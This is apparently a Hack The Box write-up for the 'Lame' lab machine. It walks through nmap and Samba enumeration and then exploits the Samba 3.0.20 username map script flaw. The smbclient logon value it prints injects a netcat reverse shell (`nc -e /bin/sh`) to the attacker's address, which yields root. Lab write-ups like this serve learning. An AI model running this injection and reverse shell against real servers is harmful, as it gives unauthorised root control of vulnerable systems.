# Lame: 10.10.10.3

## Hints

- Searchsploit is your friend
- Some samba tools need to be configured to interact with older samba versions
- If you want to avoid metasploit, Google CVE + python/ruby
- No privesc needed

## nmap

Starting with the usual `nmap` scan.

```none
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## 21: Easy Win?

Version 2.3.4 of `vsftpd` is quite well known to have an easy `root` RCE... under most conditions. See [Exploiting VSFTPD v2.3.4 on Metasploitable 2](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/) for more info. But the firewall is blocking the connection back to the attacker's system.

## Samba

The next step is samba. Reviewing the shares available.

```none
└─$ smbmap -H 10.10.10.3
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

While enumerating of the service - I discovered an interesting vulnerability using the `searchsploit` tool:

```none
└─$ searchsploit 3.0.20       
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
```

More info is available on [ExploitDB](https://www.exploit-db.com/exploits/16320). Rather than use Metasploit - I tried searching for a Python/Ruby exploit. A couple were available - but after looking at the code, it seemed the attack was centered around the username input.

```ruby
username = "/=`nohup " + payload.encoded + "`"
```

Tried to connect using `smbclient` but kept getting that same error.

```none
└─$ smbclient -N //10.10.10.3/tmp                                   
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Turn out, for `smbclient` to work, we need to add an argument to allow old versions.

```
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

Then we can spawn a shell leveraging the exploitable `login` command. and entering a username with a reverse shell. Tried netcat with the following command:

```none
"./=`nohup nc -e /bin/sh 10.10.14.56 443`"
```

The full example:

```
└─$ smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.56 443`"
Password: 
```

And, as usual, a listener on the attacker's system.

```
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.56] from (UNKNOWN) [10.10.10.3] 38641
id
uid=0(root) gid=0(root)
```

## Flag: User

With root access, this is trivial:

```
ls /home
ftp
makis
service
user
wc -c /home/makis/user.txt
33 /home/makis/user.txt
```

## Flag: Root

With root access, this is trivial:

```
wc -c /root/root.txt
33 /root/root.txt
```

## Resources

- [HTB: Lame by 0xdf](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#samba-exploit)
- [HackTheBox - Lame Writeup w/o Metasploit by Noobsec](https://www.noobsec.net/hackthebox/htb-lame/)
- [Hack The Box: Lame by Jeroen Vansaane](https://jeroenvansaane.com/htb/lame)
